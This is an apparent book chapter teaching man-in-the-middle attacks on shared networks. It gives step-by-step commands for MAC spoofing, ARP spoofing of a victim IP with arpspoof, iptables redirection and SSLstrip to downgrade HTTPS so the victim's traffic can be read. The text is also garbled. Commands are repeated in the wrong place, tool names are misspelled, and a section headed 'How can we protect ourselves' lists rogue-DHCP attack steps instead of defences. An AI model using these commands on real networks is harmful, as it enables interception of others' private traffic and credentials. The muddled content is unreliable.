    ## What is a MITM (Man In Middle) attack ?


    MITM is a type of cyber attack in order to listen to the traffic of users connected
    to the same network.


    What this means? It means that if you go to a café in town, someone can connect
    with you to the same Wi-Fi, and from just a few commands you can see all your
    conversations on Facebook, Google, etc.


    That''s how it is, but do not worry because things are not that simple. Why? Because
    the vast majority of our Internet connections are secured (HTTPS instead of HTTP;)),
    instead it does not mean that there can be no one listening to your traffic.


    To avoid such situations, I recommend that you use a VPN in public places. In
    Figure 5.3 you can see an example of an MITM attack:


    ### # Man In The Middle


    ![](img/85e17094b9b0b18870d12b91b22fb038_55_0.png)


    ## Figure 5.3


    There are several ways you can do MITM (I will list below just a few of the many
    possibilities below):


    - MAC Spoofing

    - ARP Spoofing

    - Rogue DHCP Server

    - STP Attack

    - DNS Poisoning


    These are some of the most common. In the following I will discuss some of these
    and I will give you some practical examples of how to do it.


    ### 1) MAC Spoofing


    The term spoofing comes from deceiving, and in this case it refers to the deception
    of at least one device in the network by the fact that a certain computer is given
    as another computer (or even Router) using its MAC address.


    This can be done very easily using a program that changes your MAC address with
    a PC to see its traffic. Here''s an example (https://windowsreport.com/mac-address-changer-windows-10/)
    on Windows 10 about how to change your MAC address, but in my opinion the process
    is much more complex, compared to Linux:


    ```bash

    # ifconfig eth0 down

    # macchanger -m 00:d0:70:00:20:69 eth0

    # ifconfig eth0 up

    ```


    First, we stop the interface (eth0 in this example), then we use the macchanger
    command that helps us with the MAC address change, and the -m argument lets us
    specify an address. For verification, use the command: #ifconfig


    PS: If you want to generate a random MAC, then use: #macchanger -r eth0


    ### 2) ARP Spoofing


    ARP Spoofing works in a similar way to MAC spoofing, just as the attacker uses
    the ARP protocol to mislead the entire network about having the MAC address X
    (which is actually the Router). Thus, all network devices that want to reach the
    Internet will send the traffic to the attacker (which will redirect it to Router).
    In this situation, the attacker can see all the traffic passing through him using
    a traffic capture program such as Wireshark.


    In Figure 5.4 below, you can see how this process takes place:


    ![](img/85e17094b9b0b18870d12b91b22fb038_57_0.png)


    To initiate such an attack first we must start the routing process on Linux so
    that traffic can be sent from the victim to the Router and vice versa (through
    us, the "attackers");


    ```bash

    # echo "1" > proc/sys/net/ipv4/ip_forward

    # cat /proc/sys/net/ipv4/ip_forward

    ```


    We are redirecting the traffic to the port we want to listen to:


    ```bash

    # iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDRECT --to-port
    8181

    ```


    After which we need to install the program:


    ```bash

    # sudo apt-get update

    # sudo apt-get install dnsiff

    ```


    And now we give the command to start the attack:


    ```bash

    # arpspoof -i eth0 -t 192.168.1.3 192.168.1.1

    # arpspoof -i eth0 -t 192.168.1.1 192.168.1.3

    ```


    - -i eth0: is the interface on which we will start the attack

    - -t 192.168.1.3: is the IP of the victim (the device we want to attack - CHANGE
    with an IP from your network)

    - 192.168.1.1: is the Router IP (CHANGE the Router IP to your Router)


    Virtually these two orders, send fake packages to the two devices informing them
    that traffic has to pass through the attacker. Now all you have to do is open
    Wireshark and see how the victim''s traffic "passes through you".


    Here is another need for an element that will facilitate the DECRYPTION of traffic.
    Why? Because much of the Internet traffic is encrypted.

    With this tool we will use: SSLstrip (removes the security element, SSL), and
    the command to decrypt HTTPS traffic in HTTP is:


    ```bash

    # sudo python sslstrip.py -l 8181

    ```


    This command will listen to traffic on port 8181 and try to decrypt it. After
    that, you can start Wireshark and see the encrypted traffic (however, I suggest
    you start Wireshark and when the traffic is encrypted to see the difference.


    PS: At a simple search, you will find Ettercap. To use it:


    ```bash

    # sudo python sslstrip.py -l 8181

    ```


    - -i eth0: is the interface on which we will start the attack

    - -t 192.168.1.3: is the IP of the victim (the device we want to attack - CHANGE
    with an IP from your network)

    - 192.168.1.1: is the Router IP (CHANGE the Router IP to your Router)


    ### 3) Rogue DHCP Server


    This type of attack involves a DHCP server (on the network). Thus, all network
    devices that want to reach the Internet will send the traffic to the attacker
    (which will redirect it to Router). In this situation, the attacker can see all
    the traffic passing through him using a traffic capture program such as Wireshark.


    If someone wants to break this, then they will be penalized by excluding them
    (closing the port directly).


    How can we protect ourselves from MITM attack?


    -  1. Start the routing process on Linux so that traffic can be sent from the
    victim to the Router and vice versa (through us, the "attackers");

    - # echo "1" > proc/sys/net/ipv4/ip_forward

    - # cat /proc/sys/net/ipv4/ip_forward

    - 2. Install the program

    - # sudo apt-get update

    - # sudo apt-get install dhcp-server

    - 3. Configure the DHCP server

    - # nano /etc/dhcp.conf

    - 4. Add default route

    - # ip route add default via 192.168.1.1

    - 5. Start SSLstrip

    - 6. Capture the traffic


